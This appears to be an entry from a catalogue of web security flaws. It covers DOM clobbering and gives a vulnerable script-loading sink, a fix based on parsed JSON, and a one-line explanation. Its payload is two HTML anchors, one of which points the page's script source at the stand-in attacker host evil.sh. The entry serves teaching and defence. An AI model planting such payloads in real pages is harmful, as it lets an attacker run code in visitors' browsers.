---
order: 5
cwe: 79
title: DOM clobbering
category: injection
severity: medium
sink: |-
    script.src = window.config?.cdn || "/app.js"
payload: |-
    <a id="config"></a>
    <a id="config" name="cdn" href="//evil.sh/x.js"></a>
fix: |
    const config = JSON.parse(document.getElementById("config-json").textContent);
refs:
    - https://portswigger.net/web-security/dom-based/dom-clobbering
---

Sanitizers let plain anchors through. Two with `id="config"` become `window.config`, `.cdn` picks mine, and its `href` becomes your script's URL.
